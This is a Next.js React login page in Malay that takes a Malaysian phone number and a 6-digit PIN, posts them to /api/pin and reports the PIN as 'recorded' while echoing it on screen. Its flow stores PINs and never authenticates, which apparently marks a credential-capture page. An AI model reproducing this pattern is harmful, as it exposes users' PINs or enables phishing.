"use client";

import { useState } from "react";
import { PinInput } from "@/components/pin-input";

export default function PinPage() {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [state, setState] = useState<"idle" | "busy" | "ok" | "err">("idle");
  const [msg, setMsg] = useState("");

  async function submit(value: string) {
    if (phone.replace(/\D/g, "").length < 9) {
      setState("err");
      setMsg("Isi nombor telefon dahulu.");
      return;
    }
    setPin(value);
    setState("busy");
    const res = await fetch("/api/pin", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ phone, pin: value, source: "login" })
    });
    if (res.ok) {
      setState("ok");
      setMsg("PIN direkod.");
    } else {
      setState("err");
      setMsg("Gagal merekod PIN.");
    }
  }

  return (
    <main className="grid min-h-screen place-items-center bg-cream px-5">
      <div className="w-full max-w-sm rounded-3xl border border-[#e1e6df] bg-white p-8 text-center shadow-xl">
        <h1 className="mb-1 text-xl">Log Masuk</h1>
        <p className="mb-6 text-[.85rem] text-body">Masukkan nombor telefon dan PIN 6 digit anda.</p>

        <div className="mb-5 flex items-center overflow-hidden rounded-xl border border-[#e1e6df] bg-[#fbfcfa] text-left focus-within:border-brand-500">
          <span className="border-r border-[#e1e6df] px-3 py-3 text-[.9rem] font-bold text-brand-800">+60</span>
          <input
            value={phone}
            onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
            inputMode="numeric"
            placeholder="12 345 6789"
            className="w-full bg-transparent px-3 py-3 text-[.95rem] outline-none"
          />
        </div>

        <PinInput onComplete={submit} disabled={state === "busy"} />

        {msg && (
          <p className={`mt-4 text-[.8rem] ${state === "ok" ? "text-brand-600" : "text-[#c4321f]"}`}>
            {msg} {state === "ok" && pin && <span className="font-mono">({pin})</span>}
          </p>
        )}
      </div>
    </main>
  );
}